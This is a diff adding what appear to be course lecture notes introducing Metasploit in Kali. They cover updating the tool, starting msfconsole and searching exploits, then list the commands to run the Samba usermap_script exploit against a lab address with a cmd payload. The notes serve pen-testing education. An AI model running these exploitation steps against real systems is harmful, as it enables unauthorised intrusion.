@@ -1,0 +1,45 @@
+Metasploit Introduction
+    What was life like before metasploit?
+        * Pen tested had to collect hacker tools themselves from a variety of sources (dark web, hackers) and test them themselves
+        * Needed a lot of friends in the industry and dark web to get testing tools
+        * Metasploit now has competing commercial pen testing frameworks such as cobalt strike, immunity canvas
+    
+    Keeping up to date
+        * Wont apply to netlab but is important
+        * Almost all tools we use will be changing and improving over time. Always keep them up to date
+        * With metasploit, its a good idea. sudo apt --only-upgrade install metasploit-framework
+
+    Running MSFConsole in Kali
+        * Before you start metasploit console, initialize the metasploit database
+            - sudo msfdb init
+        * if you select the metasploit console from the quick menu on the left of the screen
+            - msfconsole
+        * Some people swear by the utility of the magic cow powers
+
+    Selecting an exploit
+        * Given over a thousand exploits, it might be hard to determine which one to select 
+        * show exploits command will list all exploits
+        * msf> search 2007-2447
+        * Recent versions also support grep msf> grep usermap search cve-2007
+
+    metasploit exploitation plan:
+        * Find a vulnerability
+        * Use an exploit that exploits it
+            use multi/samba/usermap_script
+        * Set options for the exploit
+            show options
+            set RHOST 172.16.28.161
+        * Determine what payload to use
+            show payloads
+        * display only applicable payloads
+        * Set payload
+            set payload cmd
+
+    Metasploit exploration plan
+        * Check for extra payload options
+            show options
+        * see even more options
+            show advanced
+        * Run the exploit
+            exploit
+        
